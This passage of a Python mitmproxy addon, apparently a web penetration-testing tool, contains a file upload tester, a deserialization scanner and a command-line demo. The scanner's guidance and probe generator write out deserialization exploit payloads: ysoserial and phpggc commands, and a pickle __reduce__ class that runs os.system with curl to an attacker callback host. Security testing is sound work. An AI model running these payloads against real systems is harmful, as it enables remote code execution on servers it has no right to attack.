                        f"curl -s https://target.com/uploads/{payload['filename']}\n"
                        f"# If response contains 'DURPIE_UPLOAD_' or PHP version, RCE confirmed"
                    ),
                )
                findings.append(f)
                self._add(f)
            else:
                # File rejected — still log as advisory if it's a critical category
                if category in ("extension_bypass", "path_traversal") and status not in (400, 403, 422):
                    self._log(f"Upload payload '{payload['filename']}' → HTTP {status} (ambiguous)")

        return findings

    # ---- mitmproxy addon hooks ----

    def request(self, flow: "http.HTTPFlow"):
        """Detect file upload requests."""
        ct = flow.request.headers.get("content-type", "")
        if "multipart/form-data" not in ct:
            return

        url = flow.request.pretty_url
        if url not in self._upload_endpoints:
            self._upload_endpoints.append(url)
            self._log(f"File upload endpoint detected: {url}")
            self._add(Finding(
                type="File Upload Endpoint Detected",
                severity="INFO",
                url=url,
                detail=(
                    "Multipart file upload detected. Queue for upload attack testing. "
                    "Run test_endpoint() to probe extension bypass, MIME manipulation, "
                    "SVG XSS, XXE, path traversal, and polyglot file attacks."
                ),
                poc=(
                    f"from advanced_attacks import FileUploadTester\n"
                    f"import asyncio\n"
                    f"async def test():\n"
                    f"    t = FileUploadTester()\n"
                    f"    findings = await t.test_endpoint('{url}')\n"
                    f"asyncio.run(test())"
                ),
            ))


# ============================================================
# DESERIALIZATION SCANNER
# ============================================================

class DeserializationScanner:
    """
    Insecure Deserialization Scanner.

    Deserialization vulnerabilities occur when untrusted data is passed to
    a deserialization function. Attackers can craft objects that execute
    arbitrary code during the deserialization process via "gadget chains" —
    sequences of existing code that, when chained together by the deserializer,
    achieve remote code execution.

    Affected platforms:
        Java:   java.io.ObjectInputStream — magic bytes 0xACED 0x0005 (base64: rO0A)
        PHP:    unserialize() — "O:4:\"User\":1:{...}" or "a:2:{...}"
        Python: pickle.loads() — opcode \x80 (protocol 2+)
        .NET:   BinaryFormatter, JSON.NET TypeNameHandling — "AAEAAAD/////"
                ASP.NET ViewState — "__VIEWSTATE" parameter

    Detection strategy:
        1. Scan request bodies, cookies, headers for serialised data signatures.
        2. Scan for parameters that commonly carry serialised data.
        3. Generate test payloads to probe for DNSHTTP callbacks (ysoserial-style).

    Note on gadget chains:
        Actual gadget chain payloads (ysoserial, phpggc, marshalsec) are generated
        as command templates here. Executing them requires the target's classpath
        context, which is available from the tester's local environment.
    """

    # Magic byte signatures for serialized object formats
    SIGNATURES = {
        "java": [
            b"\xac\xed\x00\x05",         # Java serialization magic
        ],
        "java_b64": [
            b"rO0AB",                      # base64 of 0xaced0005
            b"rO0A",
        ],
        "python_pickle": [
            b"\x80\x02",                  # pickle protocol 2
            b"\x80\x03",                  # pickle protocol 3
            b"\x80\x04",                  # pickle protocol 4
            b"\x80\x05",                  # pickle protocol 5
        ],
        "dotnet": [
            b"AAEAAAD/////",              # .NET BinaryFormatter base64
            b"\x00\x01\x00\x00\x00",     # .NET binary header
        ],
        "php": [
            # PHP serialized object patterns
        ],
    }

    # Regex patterns for text-based serialization
    TEXT_PATTERNS = {
        "php_object":    re.compile(r'O:\d+:"[A-Za-z_\\][A-Za-z0-9_\\]*":\d+:\{'),
        "php_array":     re.compile(r'a:\d+:\{'),
        "php_string":    re.compile(r's:\d+:"'),
        "dotnet_viewstate": re.compile(r'__VIEWSTATE\s*=?\s*["\']?[A-Za-z0-9+/=]{20,}'),
        "java_b64":      re.compile(r'rO0AB[A-Za-z0-9+/=]{10,}'),
        "python_pickle_b64": re.compile(r'gASV[A-Za-z0-9+/=]{10,}'),  # base64 proto 4
        "json_net_type": re.compile(r'"\\$type"\s*:\s*"[A-Za-z][A-Za-z0-9.]+,\s*[A-Za-z]'),
    }

    # Parameters commonly used to carry serialized data
    SERIALIZED_PARAM_NAMES = [
        "__viewstate", "viewstate", "__eventvalidation",
        "serialized", "object", "data", "payload", "session",
        "token", "state", "context", "cache",
    ]

    def __init__(self):
        self.findings: List[Finding] = []

    def _log(self, msg): _mlog("Deserial", msg)
    def _warn(self, msg): _mlog("Deserial", msg, "warn")

    def _add(self, f: Finding):
        self.findings.append(f)
        self._warn(str(f))

    def detect_in_bytes(self, data: bytes, source: str, url: str) -> List[Finding]:
        """Check raw bytes for binary serialization signatures."""
        findings = []
        for platform, magic_list in self.SIGNATURES.items():
            for magic in magic_list:
                if magic in data:
                    findings.append(self._make_finding(platform, source, url,
                                                        evidence=repr(magic)))
        return findings

    def detect_in_text(self, text: str, source: str, url: str) -> List[Finding]:
        """Check text for text-based serialization patterns."""
        findings = []
        for pattern_name, regex in self.TEXT_PATTERNS.items():
            m = regex.search(text)
            if m:
                platform = pattern_name.split("_")[0]
                findings.append(self._make_finding(platform, source, url,
                                                    evidence=m.group(0)[:80]))
        return findings

    def _make_finding(self, platform: str, source: str,
                      url: str, evidence: str = "") -> Finding:
        """Create a deserialization finding with gadget chain guidance."""
        gadget_hints = {
            "java": (
                "HIGH",
                "Java serialized object detected. Test with ysoserial gadget chains:\n"
                "  java -jar ysoserial.jar CommonsCollections1 'curl http://callback.attacker.com' | base64\n"
                "  java -jar ysoserial.jar CommonsCollections6 'curl http://callback.attacker.com'\n"
                "Common vulnerable libraries: commons-collections, spring, groovy, xstream"
            ),
            "php": (
                "HIGH",
                "PHP serialized object detected. Test with phpggc gadget chains:\n"
                "  phpggc -l                           # list available gadget chains\n"
                "  phpggc Laravel/RCE1 system whoami   # Laravel RCE example\n"
                "  phpggc Symfony/RCE4 system whoami   # Symfony RCE example\n"
                "Also test: __wakeup(), __destruct(), __toString() magic method chains"
            ),
            "python": (
                "CRITICAL",
                "Python pickle data detected. ANY pickle payload achieves RCE.\n"
                "  import pickle, os\n"
                "  class Exploit(object):\n"
                "      def __reduce__(self):\n"
                "          return (os.system, ('curl http://callback.attacker.com',))\n"
                "  payload = pickle.dumps(Exploit())"
            ),
            "dotnet": (
                "HIGH",
                ".NET BinaryFormatter / ViewState detected. Test with ysoserial.net:\n"
                "  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'curl http://callback'\n"
                "  ysoserial.exe -f LosFormatter -g ActivitySurrogateSelectorFromFile -c '...'\n"
                "ViewState with MachineKey: find key in web.config → forge signed payload"
            ),
            "json": (
                "HIGH",
                "JSON.NET TypeNameHandling detected ($type field). Test type confusion:\n"
                '  {"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework", ...}\n'
                "  Use ysoserial.net -f Json.Net for full payload generation"
            ),
        }

        severity, guidance = gadget_hints.get(platform, ("MEDIUM", "Review for deserialization issues"))

        return Finding(
            type=f"Insecure Deserialization - {platform.upper()}",
            severity=severity,
            url=url,
            detail=(
                f"{platform.upper()} serialized data detected in {source}. "
                "If this data reaches a deserialization function, arbitrary code "
                "execution may be possible via gadget chains."
            ),
            evidence=evidence,
            parameter=source,
            poc=guidance,
        )

    def _b64_try_decode(self, value: str) -> Optional[bytes]:
        """Attempt base64 decode, return bytes or None."""
        for s in (value, value + "=", value + "=="):
            try:
                return base64.b64decode(s)
            except Exception:
                pass
        try:
            return base64.urlsafe_b64decode(value + "==")
        except Exception:
            return None

    def scan_flow(self, flow: "http.HTTPFlow") -> List[Finding]:
        """Scan all parts of an HTTP flow for deserialization signatures."""
        findings = []
        url = flow.request.pretty_url

        # --- Request body ---
        body_bytes = flow.request.content or b""
        body_text = flow.request.get_text()

        findings += self.detect_in_bytes(body_bytes, "request_body", url)
        findings += self.detect_in_text(body_text, "request_body", url)

        # --- URL parameters ---
        for param, value in flow.request.query.items():
            if param.lower() in self.SERIALIZED_PARAM_NAMES:
                decoded = self._b64_try_decode(value)
                if decoded:
                    findings += self.detect_in_bytes(decoded, f"query:{param}", url)
                findings += self.detect_in_text(value, f"query:{param}", url)

        # --- Cookies ---
        for name, value in flow.request.cookies.items():
            decoded = self._b64_try_decode(value)
            if decoded:
                findings += self.detect_in_bytes(decoded, f"cookie:{name}", url)
            findings += self.detect_in_text(value, f"cookie:{name}", url)

        # --- Response body (for detection in API responses) ---
        if flow.response:
            resp_text = flow.response.get_text()
            findings += self.detect_in_text(resp_text, "response_body", url)

        for f in findings:
            self._add(f)
        return findings

    def generate_dns_probe(self, callback_host: str, platform: str = "java") -> str:
        """
        Generate a DNS/HTTP callback probe payload for blind deserialization detection.

        When you can't see the output of deserialization directly, a DNS lookup
        to your callback server confirms code execution without needing to see
        the command output.

        Requires an OOB callback host (Burp Collaborator, interact.sh, etc.)
        """
        probes = {
            "java": (
                f"# ysoserial DNS probe (requires Java + ysoserial.jar):\n"
                f"java -jar ysoserial.jar URLDNS 'http://{callback_host}' | base64 -w0\n\n"
                f"# Send the base64 payload in the serialized parameter\n"
                f"# If your DNS server receives a query for {callback_host}, RCE is confirmed"
            ),
            "php": (
                f"# phpggc DNS probe:\n"
                f"phpggc -b Slim/RCE1 system 'curl http://{callback_host}'\n\n"
                f"# Or craft manually using DNS lookup:\n"
                f"# O:8:'stdClass':1:{{s:3:'dns';s:30:'http://{callback_host}'}}"
            ),
            "python": (
                f"import pickle, base64\n"
                f"class DNSProbe:\n"
                f"    def __reduce__(self):\n"
                f"        import urllib.request\n"
                f"        return (urllib.request.urlopen,\n"
                f"                ('http://{callback_host}/probe',))\n"
                f"print(base64.b64encode(pickle.dumps(DNSProbe())).decode())"
            ),
            "dotnet": (
                f"# ysoserial.net DNS probe:\n"
                f"ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \\\n"
                f"  -c 'nslookup {callback_host}' -o base64"
            ),
        }
        return probes.get(platform, f"# No probe template for platform: {platform}")

    # ---- mitmproxy addon hooks ----

    def request(self, flow: "http.HTTPFlow"):
        self.scan_flow(flow)

    def response(self, flow: "http.HTTPFlow"):
        if flow.response:
            self.scan_flow(flow)


# ============================================================
# COMBINED ADDON
# ============================================================

class AdvancedAttacksSuite:
    """
    Combined Phase 5 advanced attacks suite.

    Usage:
        mitmdump -s advanced_attacks.py
    """

    def __init__(self):
        self.race = RaceConditionTester()
        self.bizlogic = BusinessLogicScanner()
        self.fileupload = FileUploadTester()
        self.deserial = DeserializationScanner()

    def running(self):
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.info("[AdvancedAttacks] Phase 5 scanners initialized")
            ctx.log.info("[AdvancedAttacks] Race condition + Business logic + "
                         "File upload + Deserialization")

    def request(self, flow: "http.HTTPFlow"):
        self.race.request(flow)
        self.bizlogic.request(flow)
        self.fileupload.request(flow)
        self.deserial.request(flow)

    def response(self, flow: "http.HTTPFlow"):
        self.deserial.response(flow)

    def done(self):
        all_findings = (
            self.race.findings + self.bizlogic.findings +
            self.fileupload.findings + self.deserial.findings
        )
        if not all_findings:
            return
        filename = f"durpie_advanced_findings_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, "w") as fh:
                json.dump([f.to_dict() for f in all_findings], fh, indent=2)
            msg = f"[AdvancedAttacks] {len(all_findings)} findings → {filename}"
            if MITMPROXY_AVAILABLE and ctx:
                ctx.log.info(msg)
            else:
                print(msg)
        except OSError as e:
            print(f"[AdvancedAttacks] Save failed: {e}")


# ============================================================
# MITMPROXY ADDONS LIST
# ============================================================

addons = [AdvancedAttacksSuite()]


# ============================================================
# STANDALONE DEMO
# ============================================================

if __name__ == "__main__":
    import sys

    print("""
Durpie v2 - Advanced Attacks (Phase 5)
=======================================
Modules:
  - RaceConditionTester   : Parallel burst + last-byte sync + anomaly detection
  - BusinessLogicScanner  : Price/quantity manipulation, workflow bypass,
                            currency confusion, coupon stacking
  - FileUploadTester      : 20+ bypass payloads (extension, MIME, magic bytes,
                            SVG XSS, XXE, path traversal, polyglots)
  - DeserializationScanner: Java/PHP/Python/.NET detection + gadget chain guidance

Usage as mitmproxy addon:
  mitmdump -s advanced_attacks.py

Standalone race condition test:
  python advanced_attacks.py race https://target.com/api/redeem POST "coupon=SAVE50"

Standalone upload test:
  python advanced_attacks.py upload https://target.com/api/upload
""")

    if len(sys.argv) >= 3:
        mode = sys.argv[1]
        target = sys.argv[2]

        async def _demo():
            if mode == "race":
                method = sys.argv[3] if len(sys.argv) > 3 else "POST"
                raw_data = sys.argv[4] if len(sys.argv) > 4 else ""
                data = dict(urllib.parse.parse_qsl(raw_data)) if raw_data else None
                t = RaceConditionTester()
                results = await t.burst(target, method, data=data, concurrency=20)
                ok = [r for r in results if r.status_code]
                statuses = Counter(r.status_code for r in ok)
                print(f"\n[+] Burst complete: {len(ok)} responses")
                print(f"    Status codes: {dict(statuses)}")
                finding = t.analyse(results, target)
                if finding:
                    print(f"\n[!] {finding}")
                else:
                    print("\n[=] No race condition indicators detected")

            elif mode == "upload":
                t = FileUploadTester()
                findings = await t.test_endpoint(target)
                print(f"\n[+] {len(findings)} upload findings:")
                for f in findings:
                    print(f"  {f}")

        asyncio.run(_demo())
